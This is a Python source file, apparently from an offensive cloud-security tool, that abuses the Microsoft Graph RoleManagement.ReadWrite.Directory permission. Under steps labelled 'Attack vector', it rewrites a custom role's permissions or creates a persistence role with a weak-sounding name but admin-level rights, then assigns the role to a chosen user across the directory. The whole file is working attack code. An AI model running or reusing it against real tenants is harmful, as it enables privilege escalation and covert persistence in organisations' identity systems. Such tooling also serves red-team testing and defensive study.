import requests
import colorama
from colorama import Fore, Style


def rolemanagemant_Vectors(request_headers, RoleSettings):
    print()
    print(
        "RoleManagement.ReadWrite.Directory - Allows the app to read and manage the role-based access control (RBAC) "
        "settings for your company's directory, without a signed-in user. ")
    print()
    try:
        print("Attack vector - update a custom role.")
        if RoleSettings["roleUpdateId"]:
            create_message_URL = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions/" + \
                                 RoleSettings["roleUpdateId"]

            message_obj = {
                "rolePermissions": [{
                    "allowedResourceActions": RoleSettings["permissions"]
                }]
            }

            result = requests.patch(create_message_URL, json=message_obj, headers=request_headers)
            print(result.text)
            if result.status_code == 204:
                print(Fore.GREEN + "updated permissions of role " + RoleSettings["roleUpdateId"])
                print(Style.RESET_ALL)

        else:
            print("Attack vector - persistence give ourself a role which sounds like something weak (like Globel Reader"
                  "which is basically Global admin in his permissions).")

            create_message_URL = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions"
            message_obj = {
                "description": RoleSettings["newRoleDesc"],
                "displayName": RoleSettings["newRoleName"],
                "rolePermissions": [{
                    "allowedResourceActions": RoleSettings["permissions"]
                }],
                "isEnabled": "true"
            }

            result = requests.post(create_message_URL, json=message_obj, headers=request_headers)
            if result.status_code == 201:
                print(Fore.GREEN + "created a custom role.")
                print(Style.RESET_ALL)

        print("Attack vector - add a role to a user.")

        create_message_URL = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments"
        message_obj = {
            "@odata.type": "#microsoft.graph.unifiedRoleAssignment",
            "roleDefinitionId": RoleSettings["roleId"],
            "principalId": RoleSettings["user"],
            "directoryScopeId": "/"
        }

        result = requests.post(create_message_URL, json=message_obj, headers=request_headers)
        if result.status_code == 201:
            print(Fore.GREEN + "added a role of " + RoleSettings["roleId"] + " to " + RoleSettings["user"])
            print(Style.RESET_ALL)

    except:
        pass
